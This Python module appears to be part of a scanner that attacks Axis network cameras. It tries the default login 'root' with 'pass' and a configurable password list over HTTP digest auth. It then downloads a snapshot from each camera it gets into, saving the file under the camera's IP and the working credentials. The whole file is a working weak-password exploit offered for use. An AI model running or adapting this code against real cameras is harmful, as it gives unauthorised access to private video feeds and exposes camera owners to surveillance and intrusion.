import requests
from requests import auth as req_auth

from loguru import logger

from .base import WeakPasswordPOC


class AxisWeakPassword(WeakPasswordPOC):
    product_key = 'axis'

    def verify(self, ip, port=80):
        # Axis uses 'root' as default user and 'pass' as an additional default password
        for user in ['root']:
            for password in ['pass'] + list(self.config.passwords):
                try:
                    if self._check(ip, port, user, password):
                        return ip, str(port), self.product, str(user), str(password), self.name
                except Exception as e:
                    logger.debug(e)
        return None

    def _check(self, ip, port, user, password):
        r = requests.get(f"http://{ip}:{port}/jpg/image.jpg",
                         auth=req_auth.HTTPDigestAuth(user, password),
                         headers=self.headers, timeout=self.config.timeout, verify=False)
        return r.status_code == 200

    def exploit(self, results):
        ip, port, _, user, password, _ = results
        return self._snapshot(f"http://{ip}:{port}/jpg/image.jpg",
                              f"{ip}-{port}-{user}-{password}.jpg",
                              auth=req_auth.HTTPDigestAuth(user, password))
